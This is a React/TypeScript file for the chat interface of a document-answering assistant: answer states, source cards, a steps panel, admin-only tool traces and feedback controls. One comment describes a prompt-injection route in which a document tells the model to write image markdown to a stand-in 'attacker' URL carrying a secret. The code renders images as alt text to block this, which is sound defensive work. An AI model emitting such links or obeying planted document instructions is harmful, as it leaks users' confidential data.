import { useState } from "react"
import ReactMarkdown, { type Components } from "react-markdown"
import remarkGfm from "remark-gfm"
import {
  BookOpen,
  Check,
  ChevronRight,
  Clock,
  ExternalLink,
  FileText,
  Globe,
  Info,
  Loader2,
  Lock,
  RotateCcw,
  SearchX,
  ShieldAlert,
  Sparkles,
  ThumbsDown,
  ThumbsUp,
  TriangleAlert,
} from "lucide-react"
import { toast } from "sonner"

import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible"
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
import { Textarea } from "@/components/ui/textarea"
import { ToggleGroup, ToggleGroupItem } from "@/components/ui/toggle-group"
import { Tooltip, TooltipContent, TooltipTrigger } from "@/components/ui/tooltip"
import {
  api,
  type AnswerState,
  type Feedback,
  type FeedbackReason,
  type Source,
  type Step,
  type StepLine,
} from "@/lib/api"

// One line of the steps panel, live while the assistant works.
export interface LiveStep extends StepLine {
  done: boolean
}

// A message as the chat shows it: a question, or an answer (streaming, or finished
// in one of the AnswerStates).
export interface Message {
  key: string // stable React key
  id?: string // the saved message's id, once the server has one
  role: "user" | "assistant"
  text: string
  state?: AnswerState
  question?: string // an answer's question (Rephrase, Try again)
  sources?: Source[]
  trace?: Step[] // admins: each tool's raw input and output
  standalone?: string | null // a follow-up as it was searched
  withheld?: boolean
  feedback?: Feedback | null
  limited?: string // turned away by a rate limit: the server's words
  streaming?: boolean
  status?: string
  steps?: LiveStep[]
}

export interface AnswerActions {
  onRetry: (message: Message) => void
  onRephrase: (question: string) => void
  onFeedback: (message: Message, feedback: Feedback | null) => void
}

function SourceCard({ source, index }: { source: Source; index: number }) {
  const general = source.kind === "general_knowledge"
  const isWiki = source.provider.toLowerCase().includes("outline")
  const Icon = general ? Globe : isWiki ? BookOpen : FileText
  const label = general ? `General knowledge · ${source.provider}` : source.provider
  const body = (
    <div className="flex items-center gap-3 rounded-lg border bg-card px-3 py-2 text-sm transition-colors hover:bg-muted/60">
      <span className="flex size-6 shrink-0 items-center justify-center rounded-md bg-muted text-xs font-medium">
        {index}
      </span>
      <Icon className="size-4 shrink-0 text-muted-foreground" />
      {/* On a phone the provider goes under the title, so the title keeps the width. */}
      <span className="min-w-0 flex-1">
        <span className="block truncate font-medium">{source.title}</span>
        <span className="block truncate text-xs text-muted-foreground sm:hidden">{label}</span>
      </span>
      <Badge
        variant={general ? "outline" : "secondary"}
        className="hidden max-w-[45%] sm:inline-flex"
      >
        <span className="truncate">{label}</span>
      </Badge>
      {source.url && <ExternalLink className="size-3.5 shrink-0 text-muted-foreground" />}
    </div>
  )
  return source.url ? (
    <a href={source.url} target="_blank" rel="noreferrer" className="min-w-0">
      {body}
    </a>
  ) : (
    body
  )
}

function StepRow({ step }: { step: LiveStep }) {
  const blocked = step.result === "blocked by access rules" || step.result === "failed"
  return (
    <div className="flex items-start gap-2 text-xs">
      <span className="mt-0.5 flex size-3.5 shrink-0 items-center justify-center">
        {!step.done ? (
          <Loader2 className="size-3.5 animate-spin text-muted-foreground" />
        ) : blocked ? (
          <TriangleAlert className="size-3.5 text-amber-600" />
        ) : (
          <Check className="size-3.5 text-emerald-600" />
        )}
      </span>
      <span className={step.done ? "text-muted-foreground" : "text-foreground"}>
        {step.label}
        {step.done ? "" : "…"}
        {step.result && <span className="text-muted-foreground/80"> · {step.result}</span>}
      </span>
    </div>
  )
}

// What the assistant did: live while it works, then folded into one line. The raw
// tool input and output ("Technical details") come from the server for admins only.
function StepsPanel({ message }: { message: Message }) {
  const steps = message.steps ?? []
  const details = (message.trace ?? []).filter((t) => t.input !== undefined)
  if (message.streaming) {
    return (
      <div className="space-y-1.5 rounded-xl border border-border/60 bg-muted/30 px-3 py-2.5">
        {steps.length === 0 && (
          <div className="flex items-center gap-2 text-xs text-foreground">
            <Loader2 className="size-3.5 animate-spin text-muted-foreground" />
            {message.status ?? "Thinking"}…
          </div>
        )}
        {steps.map((st) => (
          <StepRow key={st.id} step={st} />
        ))}
      </div>
    )
  }
  if (!steps.length) return null
  const summary = steps.map((st) => st.label).join(" · ")
  return (
    <Collapsible>
      <CollapsibleTrigger className="group flex max-w-full items-center gap-1.5 text-left text-xs text-muted-foreground hover:text-foreground">
        <ChevronRight className="size-3.5 shrink-0 transition-transform group-data-[state=open]:rotate-90" />
        <Check className="size-3.5 shrink-0 text-emerald-600" />
        <span className="shrink-0">
          {steps.length} step{steps.length === 1 ? "" : "s"}
        </span>
        <span className="truncate opacity-70">· {summary}</span>
      </CollapsibleTrigger>
      <CollapsibleContent className="mt-2 space-y-2">
        <div className="space-y-1.5 rounded-xl border border-border/60 bg-muted/30 px-3 py-2.5">
          {message.standalone && (
            <p className="text-xs text-muted-foreground">
              Searched for: <span className="text-foreground">{message.standalone}</span>
            </p>
          )}
          {steps.map((st) => (
            <StepRow key={st.id} step={st} />
          ))}
        </div>
        {details.length > 0 && (
          <Collapsible>
            <CollapsibleTrigger className="group flex items-center gap-1.5 text-xs text-muted-foreground hover:text-foreground">
              <ChevronRight className="size-3.5 shrink-0 transition-transform group-data-[state=open]:rotate-90" />
              Technical details
            </CollapsibleTrigger>
            <CollapsibleContent className="mt-2 space-y-2">
              {details.map((step, i) => (
                <div key={i} className="rounded-lg border bg-muted/40 p-3 text-xs">
                  <div className="mb-1 flex items-center gap-2">
                    <span className="font-medium">Step {i + 1}</span>
                    <Badge variant="outline" className="font-mono">
                      {step.tool}
                    </Badge>
                  </div>
                  <p className="font-mono text-muted-foreground">
                    input: {JSON.stringify(step.input)}
                  </p>
                  <p className="mt-1 whitespace-pre-wrap break-words text-muted-foreground">
                    {step.output}
                  </p>
                </div>
              ))}
            </CollapsibleContent>
          </Collapsible>
        )}
      </CollapsibleContent>
    </Collapsible>
  )
}

// Too many questions in the last minute: a pause, not a failure, so no red.
function LimitNotice({ text }: { text: string }) {
  return (
    <div className="flex items-start gap-2.5 rounded-xl border border-border/60 bg-muted/30 px-3 py-2.5 text-sm">
      <Clock className="mt-0.5 size-4 shrink-0 text-muted-foreground" />
      <div className="min-w-0 space-y-0.5">
        <p className="font-medium">Give it a moment</p>
        <p className="text-muted-foreground">{text}</p>
      </div>
    </div>
  )
}

// A one-line note above an answer that is only partly from the documents.
function AnswerNote({ icon: Icon, children }: { icon: typeof Info; children: string }) {
  return (
    <p className="flex items-center gap-1.5 text-xs font-medium text-muted-foreground">
      <Icon className="size-3.5 shrink-0" />
      {children}
    </p>
  )
}

// Answers never load images or render raw HTML: a document could tell the model to
// write ![](https://attacker/?q=<secret>), and the browser would send it on its own.
// An image shows as its alt text instead.
const ANSWER_MARKDOWN: Components = {
  img: ({ alt }) => (alt ? <span className="text-muted-foreground">[{alt}]</span> : null),
}

function Markdown({ text, streaming }: { text: string; streaming?: boolean }) {
  return (
    <div className="max-w-none text-sm leading-relaxed [&_a]:underline [&_li]:my-0.5 [&_ol]:list-decimal [&_ol]:pl-5 [&_p]:my-2 [&_ul]:list-disc [&_ul]:pl-5">
      <ReactMarkdown remarkPlugins={[remarkGfm]} skipHtml components={ANSWER_MARKDOWN}>
        {text}
      </ReactMarkdown>
      {streaming && (
        <span className="ml-0.5 inline-block h-4 w-1.5 translate-y-0.5 animate-pulse rounded-sm bg-foreground/60" />
      )}
    </div>
  )
}

const REASONS: { value: FeedbackReason; label: string }[] = [
  { value: "wrong", label: "Wrong or made up" },
  { value: "wrong_source", label: "Wrong source" },
  { value: "missing", label: "Didn't find it, but it exists" },
  { value: "outdated", label: "Out of date" },
  { value: "refused", label: "Refused when it shouldn't" },
  { value: "unclear", label: "Too long or unclear" },
]
const THANKS = "Thanks. An admin can see this answer and your note."

// Thumbs up / down under a finished answer. Thumbs down asks why.
function FeedbackRow({ message, onFeedback }: { message: Message; onFeedback: AnswerActions["onFeedback"] }) {
  const [open, setOpen] = useState(false)
  const [reasons, setReasons] = useState<FeedbackReason[]>([])
  const [comment, setComment] = useState("")
  const [saving, setSaving] = useState(false)
  const rating = message.feedback?.rating
  const id = message.id
  if (!id) return null

  async function send(next: 1 | -1 | null) {
    if (!id) return
    setSaving(true)
    try {
      if (next === null) {
        await api.removeFeedback(id)
        onFeedback(message, null)
      } else {
        const saved = await api.giveFeedback(id, next, next === -1 ? reasons : [], comment || null)
        onFeedback(message, saved)
        toast.success(next === 1 ? "Thanks for the feedback." : THANKS)
      }
      setOpen(false)
    } catch (err) {
      toast.error(err instanceof Error ? err.message : "Couldn't save your feedback.")
    } finally {
      setSaving(false)
    }
  }

  return (
    <div className="flex items-center gap-0.5 text-muted-foreground">
      <Tooltip>
        <TooltipTrigger asChild>
          <Button
            variant="ghost"
            size="icon-sm"
            aria-label="Helpful"
            aria-pressed={rating === 1}
            disabled={saving}
            onClick={() => send(rating === 1 ? null : 1)}
            className={rating === 1 ? "text-foreground" : ""}
          >
            <ThumbsUp className={rating === 1 ? "fill-current" : ""} />
          </Button>
        </TooltipTrigger>
        <TooltipContent>{rating === 1 ? "Undo" : "Helpful"}</TooltipContent>
      </Tooltip>
      <Popover
        open={open}
        onOpenChange={(next) => {
          setOpen(next)
          if (next) {
            setReasons(message.feedback?.rating === -1 ? message.feedback.reasons : [])
            setComment(message.feedback?.rating === -1 ? (message.feedback.comment ?? "") : "")
          }
        }}
      >
        <Tooltip>
          <TooltipTrigger asChild>
            <PopoverTrigger asChild>
              <Button
                variant="ghost"
                size="icon-sm"
                aria-label="Not helpful"
                aria-pressed={rating === -1}
                disabled={saving}
                className={rating === -1 ? "text-foreground" : ""}
              >
                <ThumbsDown className={rating === -1 ? "fill-current" : ""} />
              </Button>
            </PopoverTrigger>
          </TooltipTrigger>
          <TooltipContent>Not helpful</TooltipContent>
        </Tooltip>
        <PopoverContent align="start" className="w-80 gap-3">
          <p className="text-sm font-medium">What went wrong?</p>
          <ToggleGroup
            type="multiple"
            variant="outline"
            size="sm"
            spacing={1}
            value={reasons}
            onValueChange={(v) => setReasons(v as FeedbackReason[])}
            className="w-full flex-wrap"
            aria-label="Reasons"
          >
            {REASONS.map((r) => (
              <ToggleGroupItem key={r.value} value={r.value} className="text-xs">
                {r.label}
              </ToggleGroupItem>
            ))}
          </ToggleGroup>
          <Textarea
            value={comment}
            onChange={(e) => setComment(e.target.value)}
            placeholder="Anything else? (optional)"
            aria-label="Note for an admin"
            maxLength={1000}
            className="min-h-16"
          />
          <p className="text-xs text-muted-foreground">
            HR and admins see this answer, its question and your note.
          </p>
          <div className="flex justify-end gap-2">
            {rating === -1 && (
              <Button variant="ghost" size="sm" disabled={saving} onClick={() => send(null)}>
                Remove
              </Button>
            )}
            <Button size="sm" disabled={saving} onClick={() => send(-1)}>
              {saving && <Loader2 className="animate-spin" />}
              Send feedback
            </Button>
          </div>
        </PopoverContent>
      </Popover>
    </div>
  )
}

function RetryButton({ message, onRetry }: { message: Message; onRetry: AnswerActions["onRetry"] }) {
  return (
    <Button variant="outline" size="sm" onClick={() => onRetry(message)}>
      <RotateCcw />
      Try again
    </Button>
  )
}

// The body of an answer, by how it ended (C5). "Not found", "blocked" and failures
// are notices, so they can't be mistaken for an answer from the documents.
function AnswerBody({ message, actions }: { message: Message; actions: AnswerActions }) {
  const { state, text } = message
  if (message.withheld) {
    return (
      <Alert>
        <Lock />
        <AlertTitle>Answer hidden</AlertTitle>
        <AlertDescription>
          This answer used documents your current role can't see, so it isn't shown.
        </AlertDescription>
      </Alert>
    )
  }
  if (state === "blocked") {
    return (
      <Alert>
        <ShieldAlert />
        <AlertTitle>Can't answer that</AlertTitle>
        <AlertDescription>{text}</AlertDescription>
      </Alert>
    )
  }
  if (state === "not_found") {
    return (
      <Alert>
        <SearchX />
        <AlertTitle>Your documents don't cover this</AlertTitle>
        <AlertDescription>
          <Markdown text={text} />
          <div className="mt-2 flex flex-wrap gap-2">
            {message.question && (
              <Button variant="outline" size="sm" onClick={() => actions.onRephrase(message.question!)}>
                Rephrase
              </Button>
            )}
            {message.id && message.feedback?.reasons?.includes("missing") !== true && (
              <Button
                variant="ghost"
                size="sm"
                onClick={async () => {
                  try {
                    const saved = await api.giveFeedback(message.id!, -1, ["missing"])
                    actions.onFeedback(message, saved)
                    toast.success("Thanks. HR and admins can see that this is missing.")
                  } catch (err) {
                    toast.error(err instanceof Error ? err.message : "Couldn't tell an admin.")
                  }
                }}
              >
                Tell an admin it's missing
              </Button>
            )}
          </div>
        </AlertDescription>
      </Alert>
    )
  }
  if (state === "error") {
    return (
      <Alert variant="destructive">
        <TriangleAlert />
        <AlertTitle>Couldn't answer</AlertTitle>
        <AlertDescription>
          <p>{text || "Something went wrong."}</p>
          {message.id && (
            <div className="mt-2">
              <RetryButton message={message} onRetry={actions.onRetry} />
            </div>
          )}
        </AlertDescription>
      </Alert>
    )
  }
  if (state === "pending") {
    return (
      <p className="flex items-center gap-2 text-sm text-muted-foreground">
        <Loader2 className="size-4 animate-spin" />
        Still being written. Reload in a moment to see it.
      </p>
    )
  }
  return (
    <div className="space-y-2">
      {state === "partial" && (
        <AnswerNote icon={Info}>Partly answered: the documents don't cover all of it</AnswerNote>
      )}
      {state === "general_knowledge" && (
        <AnswerNote icon={Globe}>General knowledge, not from your documents</AnswerNote>
      )}
      {text && <Markdown text={text} streaming={message.streaming} />}
      {state === "stopped" && (
        <div className="flex flex-wrap items-center gap-2">
          <span className="text-xs font-medium text-muted-foreground">
            {text ? "Stopped before the end" : "Stopped"}
          </span>
          {message.id && <RetryButton message={message} onRetry={actions.onRetry} />}
        </div>
      )}
    </div>
  )
}

const RATEABLE: AnswerState[] = ["answered", "partial", "general_knowledge", "not_found", "blocked"]

export function AssistantMessage({ message, actions }: { message: Message; actions: AnswerActions }) {
  const sources = message.withheld ? [] : (message.sources ?? [])
  const finished = !message.streaming && !message.limited
  return (
    <div className="flex gap-3" data-state={message.state}>
      <div className="flex size-8 shrink-0 items-center justify-center rounded-full bg-primary text-primary-foreground">
        <Sparkles className={message.streaming ? "size-4 animate-pulse" : "size-4"} />
      </div>
      <div className="min-w-0 flex-1 space-y-3 pt-1">
        <StepsPanel message={message} />
        {message.limited && <LimitNotice text={message.limited} />}
        {!message.limited && (message.streaming ? message.text && <Markdown text={message.text} streaming /> : <AnswerBody message={message} actions={actions} />)}

        {sources.length > 0 && (
          <div className="space-y-2">
            <p className="text-xs font-medium uppercase tracking-wide text-muted-foreground">
              Sources
            </p>
            <div className="grid min-w-0 grid-cols-1 gap-2">
              {sources.map((s, i) => (
                <SourceCard key={`${s.provider}-${s.title}`} source={s} index={i + 1} />
              ))}
            </div>
          </div>
        )}

        {finished && !message.withheld && message.state && RATEABLE.includes(message.state) && (
          <FeedbackRow key={message.id} message={message} onFeedback={actions.onFeedback} />
        )}
      </div>
    </div>
  )
}
